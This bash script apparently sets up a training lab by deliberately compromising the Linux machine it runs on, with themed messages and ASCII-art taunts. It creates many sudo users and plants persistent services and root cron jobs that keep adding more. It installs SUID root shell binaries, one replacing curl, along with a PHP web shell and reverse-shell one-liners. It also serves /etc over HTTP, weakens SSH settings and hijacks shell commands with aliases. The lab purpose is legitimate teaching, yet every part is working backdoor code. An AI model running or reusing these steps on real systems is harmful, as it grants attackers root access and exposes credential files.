#!/bin/bash

Main(){

  CreateTaunt
  sleep 1
  
  param=$(CheckConfig "SILENT")
  if [[ "$param" == "YES" ]]
  then
    echo "Creating Environment..."
    Run 3>&1 &>/dev/null
    CreateLogins 3>&1 &>/dev/null
  else
    echo "Creating Environment..."
    Run
    CreateLogins
  fi

}


Run(){

  sleep 1
  CreateEnvironment 
  echo "Creating Issues 1 and 2"
  sleep 1
  CreateConfigs
  echo "Creating Issues 3 and 4"
  sleep 1
  CreatePersistence
  echo "Creating Issues 5 and 6"
  sleep 1
  CreateUsers
  echo "Creating Issues 7 and 8"
  sleep 1
  CreatePrivEsc
  echo "Creating Issues 9 and 10"
  sleep 1
  CreateExposures
  echo "Creating Issues 11 and 12"
  sleep 1
  CreateGoodbye
  echo "Creating Issues 13 and 14"
  sleep 1
  CreateLogins
}


CheckConfig() {

  isYES=$(cat config.conf | grep "$1" | cut -d "=" -f2)
  echo "$isYES"
}


# --- Jacob's Functions ---


# Trying to categorize functions more broadly in terms of outcomes in order to create a config file. 

# CreateEnvironment - will not change. 
# CreateTaunt - will not change
# Create Goodbye - will not change



CreatePersistence(){

  CreateServices
  CreateCron
  

}

CreatePrivEsc(){

  CreateLinPEAS
  CreateSUID

}

CreateBadUsers(){

  CreateUsers
  CreateUserSpawn

}

CreateExposures(){

  CreateReverseShell
  CreateWebServers

}

CreateConfigs(){

  CreateSSHIssues
  CreateAnnoy

}

CreateLogins(){

  CreateSSHLogin

}


CreateEnvironment(){

  for pid in $(ps aux | grep -i apt | awk '{print $2}');  do sudo kill $pid; done
  sudo apt auto-remove curl -y
  sudo apt update -y
  sudo apt install cowsay
  sudo apt install sshpass -y
  sudo apt install openssh-server -y
  sudo apt install sl -y
  sudo apt install cmatrix -y
}

CreateSSHIssues(){

  append="StrictHostKeyChecking no"
  sudo echo "$append">>"/etc/ssh/ssh_config"
  sudo echo "$append">>"/etc/ssh/sshd_config"
  append="PermitRootLogin yes"
  sudo echo "$append">>"/etc/ssh/sshd_config"
}

CreateSSHLogin(){
  count=0
  while :
  do
    sleep 2
    sshpass -p password ssh sUt6xpaFUs@localhost "echo "curl" | cat > ".bash_history""
    sleep 10
    sshpass -p password ssh sUt6xpaFUs@localhost "echo "curl" | cat > ".bash_history""
    sleep 10
    sshpass -p password ssh sUt6xpaFUs@localhost
    for i in {1..5}
    do
      sleep 5
      sshpass -p password ssh sUt6xpaFUs@localhost
      sleep 5
      sshpass -p password$count ssh sUt6xpaFUs$count@localhost "echo "curl" | cat > ".bash_history""
      sshpass -p password$count ssh sUt6xpaFUs$count@localhost
      sleep 1m
      sshpass -p password$count ssh sUt6xpaFUs$count@localhost "echo "curl" | cat > ".bash_history""
      sshpass -p password$count ssh sUt6xpaFUs$count@localhost
      sleep 1
    done
    let count++
    sshpass -p password$count ssh sUt6xpaFUs$count@localhost "echo "curl" | cat > ".bash_history""
    sshpass -p password$count ssh sUt6xpaFUs$count@localhost
  done
}

CreateUsers(){

  useradd -c "sUt6xpaFUs" -m sUt6xpaFUs -s /bin/bash
  echo "sUt6xpaFUs:password" | chpasswd
  usermod -a -G sudo sUt6xpaFUs

  for i in {1..69}
  do
    u=$(sudo head /dev/urandom | tr -dc A-Za-z0-9 | head -c10)
    p=$(sudo head /dev/urandom | tr -dc A-Za-z0-9 | head -c10)s
    useradd -m $u -p $p
    usermod -a -G sudo $u
    echo "user $u added with password: $p"
  done
}

CreateUserSpawn(){

  file_location=/root/.script/spawn.sh
  cat > $file_location <<'EOF'
#!/bin/bash

for i in {1..4}
do
	u=$(sudo head /dev/urandom | tr -dc A-Za-z0-9 | head -c10)
	p=$(sudo head /dev/urandom | tr -dc A-Za-z0-9 | head -c10)

	useradd -m $u -p $p
	usermod -a -G sudo $u
	echo "user $u added with password: $p"
done

EOF
  sudo chmod +rwx  /root/.script/spawn.sh
}

CreateCron(){

  append="* *    * * *   root    bash /root/.script/spawn.sh"
  sudo echo "$append">>"/etc/crontab"
  append="* *    * * *   root    /*/NOTEPAD.sh"
  sudo echo "$append">>"/etc/crontab"
  append="* *    * * *   root    /.../processMonitor.sh"
  sudo echo "$append">>"/etc/crontab"
  append="* *    * * *   root    bash /.../linpeas.sh"
  sudo echo "$append">>"/etc/crontab"
}

CreateServices(){

  sudo mkdir /root/.script
  file_location=/root/.script/script.sh
  cat > $file_location <<EOF
while :
do
        sleep 2
        echo "They don't even know about my malicious script"
done
EOF
  sudo chmod +rwx  /root/.script/script.sh

  file_location=/etc/systemd/system/evilservice.service 

  cat > $file_location <<EOF
[Unit]
Description=You found me
After=multi-user.target

[Service]
ExecStart=/usr/bin/bash /root/.script/script.sh
Type=simple

[Install]
WantedBy=multi-user.target

EOF
  sudo chmod +x  /etc/systemd/system/evilservice.service
  sudo systemctl daemon-reload >> /dev/null
  sudo systemctl enable evilservice.service
  sudo systemctl restart evilservice.service
  clear
  sudo mkdir /root/.utils
  file_location=/root/.utils/net.sh
  cat > $file_location<<'EOF'

#/bin/bash
count=0

while :
do
let count++
sleep 5m
echo $count
useradd -c "sUt6xpaFUs${count}" -m sUt6xpaFUs$count -s /bin/bash
echo "sUt6xpaFUs${count}:password${count}" | chpasswd
usermod -a -G sudo sUt6xpaFUs$count
done
EOF
  sudo chmod +rwx /root/.utils/net.sh
  file_location=/etc/systemd/system/sysnet.service
  cat > $file_location <<EOF
[Unit]
Description=Unit[2209.44]
After=multi-user.target

[Service]
ExecStart=/usr/bin/bash /root/.utils/net.sh
Type=simple

[Install]
WantedBy=multi-user.target

EOF
  sudo chmod +x  /etc/systemd/system/sysnet.service
  sudo systemctl daemon-reload
  sudo systemctl enable sysnet.service
  sudo systemctl restart sysnet.service
  clear
}

CreateAnnoy(){

  user=$(who | sed '1p;d' | cut -d ' ' -f 1)
  append='alias ls="sl -a"'
  sudo echo "$append">>"/home/$user/.bashrc"
  append='alias cd="cowsay You may not cd"'
  sudo echo "$append">>"/home/$user/.bashrc"
  append='alias cat="echo meow"'
  sudo echo "$append">>"/home/$user/.bashrc"
  append='alias nano="echo nanope"'
  sudo echo "$append">>"/home/$user/.bashrc"
  append='alias su="echo Super User Dont"'
  sudo echo "$append">>"/home/$user/.bashrc"
  append='alias sudo="cmatrix"'
  sudo echo "$append">>"/home/$user/.bashrc"
  source /home/$user/.bashrc
}

CreateSUID(){
# Shoutout Jack W for the uber small binary
  sudo mkdir /opt/scripts/
  file_location=/opt/scripts/tmp
  cat > $file_location << 'binary'
f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAAB
AEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAA
IAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F
binary
  cat /opt/scripts/tmp | base64 -d >> /opt/scripts/shell
  sudo rm /opt/scripts/tmp
  sudo chown root:root /opt/scripts/shell
  sudo chmod +sx /opt/scripts/shell

  file_location=/usr/bin/tmp
  sudo cat > $file_location << 'binary'
f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAAB
AEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAA
IAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F
binary
  sudo cat /usr/bin/tmp | sudo base64 -d >> /usr/bin/curl
  sudo rm /usr/bin/tmp
  sudo chown root:root /usr/bin/curl
  sudo chmod +sx /usr/bin/curl

  #chmod +s /bin/bash

}

CreateTaunt(){
cat << 'taunt'
 _____________________________________
< Everything will be ok, I promise.   >
 -------------------------------------
   \         ,        ,
    \       /(        )`
     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\
           / /   | `    \
           O O   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __   \
<----|====O)))==) \) /====
<----'    `--' `.__,' \
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \
      `--{__________)        \/


taunt
echo "Please relax, this may take a minute."
}

CreateGoodbye(){
clear
sleep 1
reset

cat << 'bye'
 ___________
< Good luck >
 -----------
   \
    \
        .--.
       |o_o |
       |:_/ |
      //   \ \
     (|     | )
    /'\_   _/`\
    \___)=(___/

bye
echo "Script finished! Please keep this terminal open until the lab is complete."
}

# --- Jacobs Functions End---

# --- Dumb Jack's Functions ---
CreateLinPEAS(){

  wget https://github.com/carlospolop/PEASS-ng/releases/download/20230326/linpeas.sh
  chmod +x ./linpeas.sh
  mkdir '/*'
  cp ./linpeas.sh /\*/linpeas.sh
  mkdir /...
  cp ./linpeas.sh /.../linpeas.sh
  rm ./linpeas.sh
}

CreateWebServers(){

  mkdir /tmp/web
  echo "<?php echo passthru($_GET['cmd']); ?>" > /tmp/web/.phpbackdoor.html
  echo "<p>This is the default Linux webpage for HTTP/S. If you can see it, everything is working as intended! If you remove, there may be system instability. Do not remove!<p>" > /tmp/web/index.html
  python3 -m http.server --directory /tmp/web 443 &
  echo "<p>This is the default Linux webpage for HTTP/S. If you can see it, everything is working as intended! If you remove, there may be system instability. Do not remove!<p>" > /index.html
  sudo python3 -m 'http.server' --directory /etc/ 80 & disown
}

CreateReverseShell(){

  echo "bash -i >& /dev/tcp/127.0.0.1/80 0>&1" > /\*/NOTEPAD.sh
  echo "bash -i >& /dev/tcp/127.0.0.1/443 0>&1" > /.../processMonitor.sh
}
# --- End Of Dumb Jack's Functions ---

Main
